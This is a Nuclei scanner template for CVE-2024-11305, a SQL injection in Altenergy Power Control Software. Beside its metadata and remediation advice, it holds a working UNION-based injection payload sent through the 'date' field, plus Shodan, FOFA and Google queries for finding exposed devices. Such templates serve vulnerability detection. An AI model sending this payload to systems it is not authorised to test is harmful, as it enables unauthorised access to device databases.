id: CVE-2024-11305

info:
  name: Altenergy Power Control Software - SQL Injection
  author: s4e-io
  severity: medium
  description: |
    A vulnerability classified as critical was found in Altenergy Power Control Software up to 20241108. This vulnerability affects the function get_status_zigbee of the file /index.php/display/status_zigbee. The manipulation of the argument date leads to sql injection. The attack can be initiated remotely.
  remediation: |
    Validate and sanitize all user inputs before processing them in SQL queries. Use parameterized queries or prepared statements to prevent SQL injection attacks.
  reference:
    - https://blog.csdn.net/ZeroDay001/article/details/143878599
    - https://cn-sec.com/archives/3447233.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 6.3
    cve-id: CVE-2024-11305
    cwe-id: CWE-74
    epss-score: 0.65892
    epss-percentile: 0.98446
  metadata:
    max-request: 1
    vendor: apsystems
    product: energy_communication_unit_firmware
    shodan-query: http.title:"altenergy power control software"
    fofa-query: title="altenergy power control software"
    google-query: intitle:"altenergy power control software"
  tags: cve,cve2024,altenergy,iot,sqli,vkev

http:
  - raw:
      - |
        POST /index.php/display/status_zigbee HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        date=2024-11-06%' UNION ALL SELECT 11,CHAR(113)||CHAR(75,101,86,69,115,83,113,89,100,122,121,102,83,83,113,86,84,112,100,103,69,75,80,117,88,109,83,105,89,116,110,120,76,84,73,109,115,100,83,107)||CHAR(113,118,98,98,113),11-- wPIB

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "Status(ZigBee)", "qKeVEsSqYdzyfSSqVTpdgEKPuXmSiYtnxLTImsdSkqvbbq")'
          - 'contains(content_type, "text/html")'
          - "status_code == 200"
        condition: and
# digest: 490a0046304402203d23b5a80e77f303519c6ac63a514810ec534ed263961cd8558ce6c458b177370220303c821c2f36cbabd47add4c44b35cc0c54a47a100ef8c379ad77ca8ad30ee19:922c64590222798bb761d5b6d8e72950